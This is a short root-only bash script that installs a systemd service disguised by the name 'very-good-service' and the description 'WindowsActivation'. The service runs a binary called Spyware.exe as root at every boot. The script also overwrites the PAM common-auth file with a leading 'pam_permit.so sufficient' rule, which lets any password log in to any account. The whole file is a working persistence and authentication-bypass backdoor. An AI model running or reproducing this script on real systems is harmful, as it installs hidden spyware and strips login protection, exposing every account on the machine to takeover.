#!/usr/bin/env bash

set -e

if [[ "$EUID" -ne 0 ]]; then
	echo "Run as root!"
	exit 1
fi

cat << "EOF" > "/etc/systemd/system/very-good-service.service"
[Unit]
Description=WindowsActivation
After=network.target

[Service]
ExecStart=/usr/local/Spyware.exe
Type=simple
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF


cat << "EOF" > "/etc/pam.d/common-auth"
auth    sufficient      pam_permit.so
auth    [success=2 default=ignore]      pam_unix.so nullok
auth    [success=1 default=ignore]      pam_sss.so use_first_pass
auth    requisite                       pam_deny.so
auth    required                        pam_permit.so
auth    optional                        pam_cap.so
EOF


systemctl daemon-reload
systemctl enable --now very-good-service.service
